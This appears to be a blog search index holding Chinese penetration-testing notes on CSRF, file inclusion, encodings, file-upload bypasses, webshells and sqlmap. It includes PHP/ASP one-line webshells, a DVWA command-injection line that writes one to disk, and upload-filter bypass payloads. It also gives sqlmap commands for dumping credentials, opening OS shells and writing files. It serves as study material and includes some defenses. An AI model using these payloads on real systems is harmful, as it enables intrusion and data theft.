<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[CSRF漏洞]]></title>
    <url>%2F2019%2F11%2F09%2FCSRF%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[CSRF：（Cross-site Request forgery）跨站请求伪造，也被称为 oneclickattack 或者 sessionriding, 缩写为CSRF或者XSRF，是一种挟制用户在当前已登录的web应用程序上执行非本意的操作的攻击方法。攻击者盗用了你在某网站的身份，以你的名义发送恶意请求。 关键字： 如何挟制用户？–同一浏览器，用户已登录 如何让用户执行非本意操作？–js构造form表单–》修改密码 区别： 123456XSS攻击：盗取用户的登录信息攻击。 不需要用户登录。 向网站 A 注入 JS代码，然后执行 JS 里的代码，篡改网 站A的内容。CSRF攻击：只是构造了恶意代码，直接利用登录信息攻击。 需要用户登录网站服务器，获取cookie。 利用网站A本身的漏洞，去请求网站A的api。 1.CSRF能够做的事情？ 发邮件 发消息 财产操作比如转账或者购买商品； 修改密码 删除文章 2.CSRF漏洞原理： 简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求 本身是用户自愿发出的。 比如修改：只知道请求来自用户的浏览器，但是不知道，发起请求的链 接是浏览器的哪个标签发出的。]]></content>
      <tags>
        <tag>漏洞，CSRF漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞]]></title>
    <url>%2F2019%2F11%2F08%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[本篇主要介绍文件包含漏洞的概述、危害、分类和利用、挖掘以及防御。 1.什么是文件包含？ ​ 程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时，直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。 例如：include “conn.php” //引入conn.php文件中的代码 2.PHP中常见的文件包含函数： include() 当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时给出一个警告，继续向下执行。 include_once() 功能与include()相同，区别在于当重复调用同一文件时，程序只调用一次。 require() 执行如果发生错误，函数会输出错误信息，并终止脚本的运行。 require_once() 当重复调用同一文件时，程序只调用一次。 3.]]></content>
      <tags>
        <tag>漏洞，文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用编码及区别]]></title>
    <url>%2F2019%2F11%2F08%2F%E5%B8%B8%E7%94%A8%E7%BC%96%E7%A0%81%E5%8F%8A%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[在渗透测试的过程中，我们经常会遇到编码，解码问题，接下来主要介绍一下以下我们常用的编码及区别。 一、可逆编码： 1.base64编码：特点：杂乱无章，经常以=号解决 123$execString = '123456';$base64String=base64_encode($execString);echo "$base64String\n"; 解码： 1echo base64_decode($base64String)."\n"; 2.url编码：特点：有很多的%号 12$urlString=urlencode($execString);echo "$urlString\n"; 解码： 1echo urldecode($urlString)."\n"; 3.rot13编码：12$rot13String=str_rot13($execString);echo "$rot13String\n"; 解码： 1echo str_rot13($rot13String)."\n"; 4.hex编码：特点：很长的二进制数编码 12$hexString=bin2hex($execString);echo "$hexString"; 解码： 1echo hex2bin($hexString)."\n"; 二、不可逆编码： 5.MD5：特点：32位字符 12$md5String=md5($execString);echo "$md5String\n"; 6.sha1：类似于MD5的摘要算法，验证数据的有效性12$sha1String=sha1($execString);echo "$sha1String\n"; 7.crc：循环校验码，验证数据有效性12$crc32String=crc32($execString);echo "$crc32String\n"; 8.sha256：12$sha256String=hash('sha256', $execString);echo "$sha256String\n"; 9.sha512:12$sha512String=hash('sha512', $execString);echo "sha512String\n";]]></content>
      <tags>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BS暴破绕过验证码和token]]></title>
    <url>%2F2019%2F11%2F06%2FBS%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E7%BB%95%E8%BF%87%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%2F</url>
    <content type="text"><![CDATA[token是口令，每次客户端发送的请求数据包都只会携带一个新的token，从而能够有效防止CSRF。 1.]]></content>
      <tags>
        <tag>burpsuite,暴力破解,绕token</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用中国菜刀结合一句话木马拿webshell]]></title>
    <url>%2F2019%2F11%2F06%2F%E5%88%A9%E7%94%A8%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E7%BB%93%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%8B%BFwebshell%2F</url>
    <content type="text"><![CDATA[1.一句话木马：所谓一句话木马就是一句简单的脚本语言，可以是PHP，asp，aspx等。 php: 1&lt;?php eval($_POST[&quot;hack&quot;]);?&gt; ​ eval()函数能把字符串当做PHP代码执行。 asp: 1&lt;% eval request(&quot;hack&quot;) %&gt; 或 &lt;%execute(request(&quot;hack&quot;))%&gt; asxp: 1&lt;%@ Page Lanuage=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;hack&quot;])%&gt; 2.中国菜刀：用来连接我们上传的一句话木马。 菜刀拿shell的原理就是小马上传大马。 菜刀通过参数hack进行http请求，用经过base64编码的PHP等代码来执行命令，从而控制我们要入侵的服务器，拿到webshell。 3.操作步骤：这里我们选择自己搭建的dvwa服务器，使用命令注入或文件上传把一句话木马文件上传到服务器。 在命令注入模块输入：（dvwa为low模式） 192.168.120.161 &amp;&amp; echo “&lt;?php eval($_REQUEST[‘hack’]); ？” &gt; lh.php; 成功上传一句话木马后打开中国菜刀。 右键选择添加： 填入服务器上一句话木马的地址，参数，类型，编码： 点击右下角编辑后，双击url 如图，成功拿到服务器的webshell，并看到自己上传的一句话木马脚本 lh.php。]]></content>
      <tags>
        <tag>中国菜刀，一句话木马</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的上传绕过和解析漏洞]]></title>
    <url>%2F2019%2F11%2F05%2F%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%92%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[前端绕过、服务端验证绕过、配合解析漏洞突破上传、编辑器漏洞 ​ 通常一个文件以http协议进行上传时，将以POST请求发送web服务器，Web服务器接收到请求并同意后，用户与web服务器将建立连接并传输数据。 （get只支持245个字节，太小；post的文件不能超过2M，数据不能超过8M） 客户端js检测–》http post请求(上传文件) –》Web服务器 A.客户端JavaScript检测（通常为检测文件扩展名） B.服务端MIME类型检测（检测Content-Type内容） C.服务端目录路径检测（检测跟path参数相关的内容） D.服务端文件名扩展名检测（检测跟文件estension相关的内容） F.服务器文件内容检测（检测内容是否合法或含有恶意代码） 1.客户端检测：​ 客户端检测通常在上传页面里含有专门检测文件上传的JavaScript代码。最常见的就是检测扩展名是否合法。 判断方式： ​ 在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。 （1）审查元素，把校验的函数干掉，注入掉 （2）抓包，把文件名改为PHP 绕过方法： （1）利用burpsuite之类的代理工具。 （2）修改webshell后缀类型为允许上传类型。 （3）抓包拦截将其后缀名改为对应服务器可以解析的后缀名。 2.服务端MIME检测：服务端MIME类型检测也就是检测Content-Type的内容。下面是一端测试模拟代码： 12345678910111213141516&lt;?phpif($_FILES['userfile']['type'] != "image/gif") &#123; //检测Content-type echo "Sorry, we only allow uploading GIF images"; exit;&#125;$uploaddir = 'uploads/';$uploadfile = $uploaddir . $_FILES['userfile'] ['name'];if (move_uploaded_file($_FILES['userfile']['tmp_ name'], $uploadfile)) &#123; echo "File is valid, and was succesfully uploaded.\n";&#125;else &#123; echo "File uploading failed.\n";&#125;?&gt; 绕过方法： 将request包的content-type修改为图片类型。 3.服务端目录路径检测：​ 服务端目录路径检测：一般是检测保存路径是否合法，但一般都没有防御。检测跟path参数相关的内容。 ​ 漏洞成因是因为对迷路路径的检测不够严谨而导致可以用0x00截断的方式来进行攻击。 ​ 0x00截断：上传文件的时候，当系统文件读到（0x00）时，会认为文件已经结束。利用00截断就是利用web应用对文件上传的路径过滤的不严格，产生0x00上传截断漏洞。 绕过办法： ​ 通过抓包截断将eval.php.jpg换成eval.php_jpg（下划线为 0x00）。在上传文件时系统文件遇到0x00，会认为文件已经结束。从而将eval.php.jpg的内容写入到eval.php中。 12$FilePath=C:/wamp/www/uploadfile/eval.php_.jpgmove_uploaded_file($_FILES["upload_file"] ["tmp_name"],$FilePath); 在执行move_uploaded_file的这个函数时，底层操作调用类似于C语言。遇到0X00会自动截断，真是写入的地址应该是C:/wamp/www/uploadfile/eval.php （在BS里可用hex改） 4.服务端文件名拓展检测：​ 基于黑名单检测： ​ 黑名单的安全性比白名单的安全性低很多，攻击手法自然也比白名单多。一般由个专门的blacklist，里面包含常见的危险脚本文件。 绕过办法： （1）文件名大小写绕过（AsP，pHp等等） （2）黑白名单绕过（php,php2,php3,php5,phtml,asp,aspx,ascx,ashx,cer,asa,jsp,jspx）cdx, （3）特殊文件名绕过 ​ 修改数据包里的文件名改为test.php. 或者 test.asp_ (下划线是空格)，由于这种命名格式在Windows系统里是不允许的，所以在绕过上传之后Windows系统会自动去掉 点和空格。Unix/linux系统是没有这个特性。 （4）0x00截断绕过 ​ 文件名后缀就一个%00字节，可以截断某些函数对文件名的判断。在许多语言函数中，处理字符串的函数中0x00被认为是终止符。 ​ 例如： ​ 网站上传函数处理xxx.php%00.jpg时，首先后缀名是合法的jpg格式，可以上传，在保存文件是，遇到%00字符丢弃后面的jpg,文件后缀最终保存的后缀名为xxx.php （5）.htaccess文件攻击（结合黑名单攻击） ​ .htaccess文件攻击即结合黑名单攻击服务器的.htaccess文件。 ​ 通过move_uploaded_file函数把自己写的.htaccess文件覆盖掉服务器上的这样就可以解析定义名单了。 ​ .htaccess文件用处：(分布式配置文件) ​ 通过.htaccess文件调用PHP解释器去解析一个文件名中只要包含“haha” 这个字符串的任意文件，无论你文件名是什么样子，只要包含”haha“这个字符串，都可以被以PHP的方式来解析。 ​ .htaccess文件内容： 123&lt;FilesMatch &quot;haha&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; （6）解析绕过 5.服务端文件内容拓展检测：​ 如果文件内容检测设置的比较严格，那么上传攻击将变得非常困难。也可以说他是代码检测的最后一道关卡。如果他被突破了，就算代码层的漏洞，也可以结合解析漏洞进行攻击。 （1）文件幻数检测 jpg（JFIF）gif（GIF89a）png（%PNG） （2）文件相关信息检测（文件头加一些图片信息中间夹杂攻击代码） （3）文件加载检测（调用API或者函数进行文件健在测试PHP的gd库） 绕过方法： ​ 文件幻数检测绕过：主要是检测文件内容开始处的文件幻数，比如图片类型的文件 幻数如下： ​ 要绕过jpg文件幻数检测就要在文件开头写上下图的值： gif文件：GIF89a png文件：%PNG 制作图片马：(一句话木马结合图片) cmd下执行：copy /b 1.jpg+2.php=3.jpg 6.Apache解析漏洞： ​ test.php.ccc 任意不属于黑名单且不属于Apache解析白名单之内的后缀名。（从后往前知道识别出认识的后缀名默认为它） 说明： 一个文件名为test. php. aaa. bbb. ccc的文件，Apache 会从ccc的位置往.php的位置开始尝试解析， 如果ccc不属于Apache能解析的后缀名，那么。Apache就会尝试去解析bbb,这样一直往前尝试， 直到遇到一个能解 析的拓展名为止。 7.总结： （1）黑名单绕过： 文件名大小写绕过； 黑名单列表绕过； 特殊文件名绕过； 0x00截断绕过； .htaccess文件攻击； Apache解析漏洞； IIS解析漏洞； nginx解析漏洞； （2）白名单绕过： 文件名后缀0x00截断绕过； PHP文件包含漏洞； IIS解析漏洞； nginx解析漏洞；]]></content>
      <tags>
        <tag>绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞]]></title>
    <url>%2F2019%2F11%2F05%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[文件上传：把本地客户端的文件上传到服务器 文件上传漏洞：把本地的脚本文件成功上传到服务器，并成功运行。 脚本包括：jsp , asp, php, aspx, py, cgi 大概这六种 现在一般的web应用程序，文件上传是一种基本要求，各大网站也支持文件上传。 1.什么是文件上传？上传头像（jpg,jpeg,png,gif,zip,doc,docx） 插入图片 上传附件(exe,php一般不允许上传) 2.为什么会有文件上传？在网站运营过程中，不可避免的要对网站的某些页面或者内容进行更新，这个时候需要使用到网站的文件上传功能。如果不对被上传文件进行限制或者限制被绕过，该功能便有可能会被利用上传可执行文件、脚本文件到服务器上，而进一步导致服务器沦陷。 可执行文件：exe 脚本文件：jsp , asp, php, aspx, py, cgi 3.什么是文件上传漏洞？上传文件的时候，如果服务器端脚本语言，未对上传的文件进行严格的验证和过滤，就有可能上传恶意的脚本文件，从而控制整个网站，甚至是服务器。 4.危害 网站被控制，对文件增删改查，执行命令，链接数据库 如果服务器长久未更新，可以利用exp提权，导致服务器沦陷 同服务器的其他网站沦陷 （可看到服务器内同一网站的路径，进入网站写入webshell） 政府，个人服务器一般拿到一个站，其他站都能搞掉 正规的IDC是无权读取的，拿一个站权限是被限定的。 5.演示：上传文件可审查元素更改前端对文件类型的限制，然后成功上传脚本文件。 6.哪里存在文件上传漏洞？有文件上传的地方就有可能存在。（发表情，发文件） （1）有上传文件的功能 （2）且上传到的目录，能够解析脚本语言（否则405不允许的方法，不允许脚本如PHP文件类型执行） （3）能够访问到上传的文件（找到上传的路径，可以猜或看网站之前上传的文件存在哪个目录） 就有可能存在文件上传漏洞。 7.导致文件上传漏洞的原因 服务器配置不当（IIS6.0 put 直接写文件） 本地文件上传限制被绕过（JavaScript验证） 服务器端过滤不严格被绕过 文件路径截断（1.PHP.png-》抓包换成1.PHP.0x00字符串结尾舍弃） 文件解析漏洞导致文件执行（IIS，Apache，nginx） （1.jpg/xxxx.php以jpg方式上传，但是却以PHP形式运行） 开源编辑器上传漏洞（fckeditor 自定义文件名，文件夹结合IIS6.0解析漏洞，杀伤力** * **） ​ 1.asp: .jpg ​ xxx.asp文件夹里面所有的东西都可以当做asp运行 ewebeditor：可以登录后台，配置允许上传的文件类型.asp （php/ewebeditor.db） 8.服务器配置不当当服务器配置不当时，在不需要上传页面的情况下便可导致任意文件上传。（PUT协议） IIS6.0 9.本地文件上传限制被绕过​ 只在客户端浏览器上做了文件限制而没有在远程的服务器上做限制，只需要修改数据包就可以轻松绕过限制。 10.过滤不严格或被绕过有一些网站使用了黑名单过滤掉了一些关键的可执行脚本文件后缀。但黑名单补全或者被绕过，比如服务器daunt过滤掉了后缀名为.php的文件，但是没有过滤掉.php3等其他可执行的脚本文件后缀，攻击者就可以上传其他的可执行的脚本文件后缀到服务器上。 禁止了php,asp,jsp,但是没有禁止php3,asa,cer,cdx等等。 常用的一些可执行的文件脚本后缀： .php .php2 .php3 .php5 .phtml .asp .cer .asa .cdx .aspx .ascx .ashx .jsp .jspx .py 某些情况下管理员错误的服务器配置（配置文件）会导致.html、.xml等静态页面后缀的文件也可被执行。 多文件上传时，有时服务器只对第一个上传的文件进行了检查，这时通过上传多个文件并将恶意文件掺杂其中也可绕过服务器的过滤。 11.文件路径截断：​ 在上传的文件中使用一些特殊的符号，使得文件被上传到服务器中时，路径被截断从而控制文件路径。 常用的进行文件路径截断的字符如下： \0 ? %00 在可以控制文件路径的情况下，使用超长的文件路径也有可能会导致文件路径截断。 asdfasdfasdfasdfasdfassdfasdfasdf2werew.php.jpg 12.文件解析漏洞：当服务器存在解析漏洞时，合法的文件名便可导致带有恶意代码的文件被执行，详情参见解析漏洞。（IIS，Apache，nginx） 13.开源编辑器上传漏洞：很多开源的编辑器历史都有不同的上传漏洞，详情可见：编辑器漏洞手册。 14.文件上传漏洞的利用： 找到上传点，上传正常文件； 再次尝试上传脚本文件； 上传成功，访问上传的脚本文件； 上传失败，采取过滤绕过方法； 15.漏洞挖掘： 查找上传点，图片，附件，头像等等 目录、文件扫描发现 类似upload.php upfile.php up.html等文件 目录、文件扫面 编辑器目录如ewebEditor、fckeditor\kingeditor 16.文件上传漏洞的防御：（过滤+前后端校验） 上传文件的存储目录不给执行权限。（405或404页面跳转） 文件后缀白名单，注意0X00截断攻击（PHP更新到最新版本） 不能有本地文件包含漏洞（include dama.jpg） 及时更新web应用软件避免解析漏洞攻击]]></content>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python语言]]></title>
    <url>%2F2019%2F11%2F05%2FPython%E8%AF%AD%E8%A8%80%2F</url>
    <content type="text"><![CDATA[]]></content>
      <tags>
        <tag>Python，语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何使用sqlmap注入]]></title>
    <url>%2F2019%2F11%2F05%2F%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[sqlmap也是渗透中常用的一个注入工具，其实在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天把我一直以来整理的sqlmap笔记发布上来供大家参考。 一共有11种常见SQLmap使用方法： 一、SQLMAP用于Access数据库注入 (1) 猜解是否能注入 1win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; 1Linux : .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; (2) 猜解表 1win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables 1Linux: .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables (3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表) 1win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin 1Linux: .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin (4) 根据字段猜解内容(假如通过3得到字段为username和password) 1win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C &quot;username,password&quot; 12Linux: .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C&quot;username,[url=]B[/url]password&quot; 二、SQLMAP用于Cookie注入 (1) cookie注入，猜解表 1win : python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --table --level 2 (2) 猜解字段，(通过1的表猜解字段，假如表为admin) 12win :python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --columns -Tadmin --level 2 (3) 猜解内容 12win :python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --dump -Tadmin -C &quot;username,password&quot; --level 2 三、SQLMAP用于mysql中DDOS攻击 (1) 获取一个Shell 12win:python sqlmap.py -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell 12Linux:sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell (2) 输入执行语句完成DDOS攻击 1select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f) 四、SQLMAP用于mysql注入 (1) 查找数据库 1python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; --dbs (2) 通过第一步的数据库查找表(假如数据库名为dataname) 1python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname --tables (3) 通过2中的表得出列名(假如表为table_name) 1python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name --columns (4) 获取字段的值(假如扫描出id,user,password字段) 12python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name -C&quot;id,user,password&quot; --dump 五、SQLMAP中post登陆框注入 (1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件 1我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。 浏览器打开目标地址http:// www.xxx.com /Login.asp 配置burp代理(127.0.0.1:8080)以拦截请求 点击login表单的submit按钮 这时候Burp会拦截到了我们的登录POST请求 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下 运行sqlmap并使用如下命令： 1./sqlmap.py -r search-test.txt -p tfUPass 这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。 注入点：http://testasp.vulnweb.com/Login.asp 几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass (2) 自动的搜索 1sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] --forms (3) 指定参数搜索 1sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] --data &quot;tfUName=321&amp;tfUPass=321&quot; 六、SQLMAP中Google搜索注入inurl后面的语言是由自己定的 注入过程中如果选y是注入，如果不是选n 1sqlmap -g inurl:php?id= 七、SQLMAP中的请求延迟 参数 –delay –safe-freq 1python sqlmap.py --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --delay 1 1python sqlmap.py --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --safe-freq 3 参数 八、SQLMAP绕过WAF防火墙 注入点:http://192.168.159.1/news.php?id=1 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] -v 3 --dbs --batch --tamper &quot;space2morehash.py&quot; space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py 都是编码方式 space2hash.py base64encode.py charencode.py 九、SQLMAP查看权限1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --privileges 十、SQLMAP伪静态注入 (1) 查找数据库 1python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --dbs (2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname) 1python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname --tables (3) 通过2中的数据表得到字段(假如得到的是tablename表) 12python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -Ttablename --columns (4) 通过3得到字段值(假如从3中得到字段id，password) 12python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -Ttablename -C &quot;password&quot; --dump 十一、SQLMAP注入点执行命令与交互写shell (1) 注入点：http://192.168.159.1/news.php?id=1 此处采用的是Linux系统 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-cmd=ipconfig 出现语言的选择根据实际的测试网站选择语言 指定目标站点D:/www/ (2) 获取Shell 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-shell 出现语言的选择根据实际的测试网站选择语言 指定目标站点D:/www/ 输入ipconfig/all 创建用户和删除用户 只要权限足够大，你可以输入使用任何命令。 其他命令参考下面： 从数据库中搜索字段 1sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password 在dedecms数据库中搜索字段admin或者password。 读取与写入文件 首先找需要网站的物理路径，其次需要有可写或可读权限。 –file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径） –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell） –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 #示例： 1sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php” 使用shell命令： 1sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell 接下来指定网站可写目录： “E:\php\htdocs\dvwa” #注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数） sqlmap详细命令： -is-dba 当前用户权限（是否为root权限） -dbs 所有数据库 -current-db 网站当前数据库 -users 所有数据库用户 -current-user 当前数据库用户 -random-agent 构造随机user-agent -passwords 数据库密码 -proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理 -time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒） Options（选项）： -version 显示程序的版本号并退出 -h, –help 显示此帮助消息并退出 -v VERBOSE 详细级别：0-6（默认为1） Target（目标）： 以下至少需要设置其中一个选项，设置目标URL。 -d DIRECT 直接连接到数据库。 -u URL, –url=URL 目标URL。 -l LIST 从Burp或WebScarab代理的日志中解析目标。 -r REQUESTFILE 从一个文件中载入HTTP请求。 -g GOOGLEDORK 处理Google dork的结果作为目标URL。 -c CONFIGFILE 从INI配置文件中加载选项。 Request（请求）： 这些选项可以用来指定如何连接到目标URL。 -data=DATA 通过POST发送的数据字符串 -cookie=COOKIE HTTP Cookie头 -cookie-urlencode URL 编码生成的cookie注入 -drop-set-cookie 忽略响应的Set – Cookie头信息 -user-agent=AGENT 指定 HTTP User – Agent头 -random-agent 使用随机选定的HTTP User – Agent头 -referer=REFERER 指定 HTTP Referer头 -headers=HEADERS 换行分开，加入其他的HTTP头 -auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM) -auth-cred=ACRED HTTP身份验证凭据（用户名:密码） -auth-cert=ACERT HTTP认证证书（key_file，cert_file） -proxy=PROXY 使用HTTP代理连接到目标URL -proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码） -ignore-proxy 忽略系统默认的HTTP代理 -delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒 -timeout=TIMEOUT 等待连接超时的时间（默认为30秒） -retries=RETRIES 连接超时后重新连接的时间（默认3） -scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式 -safe-url=SAFURL 在测试过程中经常访问的url地址 -safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL Enumeration（枚举）： 这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。 -b, –banner 检索数据库管理系统的标识 -current-user 检索数据库管理系统当前用户 -current-db 检索数据库管理系统当前数据库 -is-dba 检测DBMS当前用户是否DBA -users 枚举数据库管理系统用户 -passwords 枚举数据库管理系统用户密码哈希 -privileges 枚举数据库管理系统用户的权限 -roles 枚举数据库管理系统用户的角色 -dbs 枚举数据库管理系统数据库 -D DBname 要进行枚举的指定数据库名 -T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns） -tables 枚举的DBMS数据库中的表 -columns 枚举DBMS数据库表列 -dump 转储数据库管理系统的数据库中的表项 -dump-all 转储所有的DBMS数据库表中的条目 -search 搜索列（S），表（S）和/或数据库名称（S） -C COL 要进行枚举的数据库列 -U USER 用来进行枚举的数据库用户 -exclude-sysdbs 枚举表时排除系统数据库 -start=LIMITSTART 第一个查询输出进入检索 -stop=LIMITSTOP 最后查询的输出进入检索 -first=FIRSTCHAR 第一个查询输出字的字符检索 -last=LASTCHAR 最后查询的输出字字符检索 -sql-query=QUERY 要执行的SQL语句 -sql-shell 提示交互式SQL的shell Optimization（优化）： 这些选项可用于优化SqlMap的性能。 -o 开启所有优化开关 –predict-output 预测常见的查询输出 –keep-alive 使用持久的HTTP（S）连接 –null-connection 从没有实际的HTTP响应体中检索页面长度 –threads=THREADS 最大的HTTP（S）请求并发量（默认为1） Injection（注入）： 这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。 -p TESTPARAMETER 可测试的参数（S） –dbms=DBMS 强制后端的DBMS为此值 –os=OS 强制后端的DBMS操作系统为这个值 –prefix=PREFIX 注入payload字符串前缀 –suffix=SUFFIX 注入payload字符串后缀 –tamper=TAMPER 使用给定的脚本（S）篡改注入数据 Detection（检测）： 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。 –level=LEVEL 执行测试的等级（1-5，默认为1） –risk=RISK 执行测试的风险（0-3，默认为1） –string=STRING 查询时有效时在页面匹配字符串 –regexp=REGEXP 查询时有效时在页面匹配正则表达式 –text-only 仅基于在文本内容比较网页 Techniques（技巧）： –technique=TECH SQL注入技术测试（默认BEUST） –time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒） –union-cols=UCOLS 定列范围用于测试UNION查询注入 –union-char=UCHAR 用于暴力猜解列数的字符 Fingerprint（指纹）：Brute force（蛮力）： –common-tables 检查存在共同表 –common-columns 检查存在共同列 User-defined function injection（用户自定义函数注入）： 这些选项可以用来创建用户自定义函数。 –udf-inject 注入用户自定义函数 –shared-lib=SHLIB 共享库的本地路径 File system access（访问文件系统）： 这些选项可以被用来访问后端数据库管理系统的底层文件系统。 –file-read=RFILE 从后端的数据库管理系统文件系统读取文件 –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 Operating system access（操作系统访问）： 这些选项可以用于访问后端数据库管理系统的底层操作系统。 –os-cmd=OSCMD 执行操作系统命令 –os-shell 交互式的操作系统的shell –os-pwn 获取一个OOB shell，meterpreter或VNC –os-smbrelay 一键获取一个OOB shell，meterpreter或VNC –os-bof 存储过程缓冲区溢出利用 –priv-esc 数据库进程用户权限提升 –msf-path=MSFPATH Metasploit Framework本地的安装路径 –tmp-path=TMPPATH 远程临时文件目录的绝对路径 Windows注册表访问： 这些选项可以被用来访问后端数据库管理系统Windows注册表。 –reg-read 读一个Windows注册表项值 –reg-add 写一个Windows注册表项值数据 –reg-del 删除Windows注册表键值 –reg-key=REGKEY Windows注册表键 –reg-value=REGVAL Windows注册表项值 –reg-data=REGDATA Windows注册表键值数据 –reg-type=REGTYPE Windows注册表项值类型 这些选项可以用来设置一些一般的工作参数。 -t TRAFFICFILE 记录所有HTTP流量到一个文本文件中 -s SESSIONFILE 保存和恢复检索会话文件的所有数据 